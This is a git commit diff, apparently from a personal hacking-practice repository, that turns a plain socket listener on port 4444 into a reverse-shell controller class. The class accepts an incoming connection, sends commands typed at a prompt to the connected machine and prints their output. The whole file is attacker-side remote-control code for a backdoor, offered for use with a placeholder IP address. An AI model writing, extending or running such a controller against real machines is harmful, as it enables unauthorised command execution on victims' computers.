856208db7160fa6036eb22ba5287d87c05a94d27
HellReys <wallpapertopia@gmail.com>
2024-07-11 15:14:02 -0400

    Second Update!

--- listener.py
+++ listener.py
@@ -2,10 +2,27 @@
 
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("YOUR IP ADDRESS", 4444)) # Your ıp address and port which is you want to use
-listener.listen(0)
-print("[+] Waiting for incoming connections")
-listener.accept()
-print("[+] Got a connection")
+
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))  # Your ıp address and port which is you want to use
+        listener.listen(0)
+        print("[+] Waiting for incoming connections")
+        self.connection, address = listener.accept()
+        print("[+] Got a connection from" + str(address))
+
+
+    def execute_remotely(self,command):
+        self.connection.send(command)
+        return self.connection.recv(1024)
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            result = self.execute_remotely(command)
+            print(result)
+
+my_listener = Listener("YOUR IP ADDRESS", 4444)
+my_listener.run()
